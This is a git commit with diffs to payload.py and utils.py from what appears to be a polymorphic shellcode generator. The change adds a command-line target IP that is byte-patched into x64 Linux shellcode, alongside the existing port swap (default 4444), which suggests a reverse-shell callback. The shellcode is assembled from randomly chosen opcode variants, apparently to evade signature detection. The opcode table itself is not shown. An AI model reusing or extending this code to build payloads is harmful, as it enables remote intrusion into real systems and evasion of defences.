376cc2f6aab43fb7508374b2bc3f9d4f8db293ef
Brucky <bouncebloc95@gmail.com>
2024-03-06 16:22:06 +0100

    [FEATURE] Custom ip from cli arg

--- payload.py
+++ payload.py
@@ -1,19 +1,22 @@
 from opcodes import permut_list
 from random import randint
-from utils import convert_port_to_little_endian
+from utils import *
 
 class Payload:
-    def __init__(self,platform,port=4444):
+    def __init__(self,platform,port,ip):
         self.shellcode = ""
         self.platform = platform
         self.arch = "x64"
         self.target_port = port
+        self.target_ip = ip
 
     def __str__(self):
-        return f"\nPlatform: {self.platform} {self.arch} - {self.get_bytes_size()} Bytes\nPort: {self.target_port} \nShellcode:\n{self.shellcode}"
+        return f"\nPlatform: {self.platform} {self.arch} - {self.get_bytes_size()} Bytes\nIP: {self.target_ip}\nPort: {self.target_port} \nShellcode:\n{self.shellcode}"
 
     def permut(self):
-        permut_list[18][0] = permut_list[18][0].replace(r"\x11\x5c", convert_port_to_little_endian(self.target_port)) # Weird trick for the moment to swap the port (to change)
+        permut_list[18][0] = permut_list[18][0].replace(r"\x11\x5c", convert_port_to_hex(self.target_port)) # Weird trick for the moment to swap the port (to change)
+        permut_list[17][0] = permut_list[17][0].replace(r"\x7f\x01\x01\x01", ip_to_hex(self.target_ip)) # Weird trick for the moment to swap the ip (to change)
+        
         if self.platform == "Linux":
             for line in permut_list:
                     self.shellcode += line[randint(0,len(line)-1)]
--- utils.py
+++ utils.py
@@ -1,6 +1,15 @@
-def convert_port_to_little_endian(port):
+def convert_port_to_hex(port):
     hex_value = hex(port)
 
     little_endian = hex_value[2:]
     little_endian = r"\x"+r"\x".join([little_endian[i:i+2] for i in range(0, len(little_endian), 2)])  # On inverse les octets par paires
     return little_endian
+
+def ip_to_hex(ip_address):
+    # Split the IP address into octets
+    octets = ip_address.split('.')
+    
+    # Convert each octet to hexadecimal and join them with '\x'
+    hex_ip = ''.join([f'\\x{int(octet):02x}' for octet in octets])
+    
+    return hex_ip
